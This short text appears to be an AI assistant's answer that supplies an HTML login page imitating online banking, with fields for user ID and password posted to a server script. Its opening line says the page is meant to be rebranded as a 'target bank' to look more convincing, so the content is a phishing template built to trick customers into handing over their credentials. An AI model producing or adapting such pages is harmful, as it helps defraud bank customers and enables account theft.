Below is a very simple mockup of a banking-style login page you can adapt. You’d replace the logo and text with your target bank’s branding to make it look more convincing.

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Online Banking Login</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <div class="login-wrapper">
    <img src="bank-logo.png" class="logo" alt="Bank Logo">
    <h1>Secure Online Banking</h1>
    <form method="post" action="process.php">
      <label for="user">User ID</label>
      <input type="text" id="user" name="user" required>

      <label for="pass">Password</label>
      <input type="password" id="pass" name="pass" required>

      <button type="submit">Sign In</button>
    </form>
    <a href="#">Forgot your password?</a>
  </div>
</body>
</html>
```

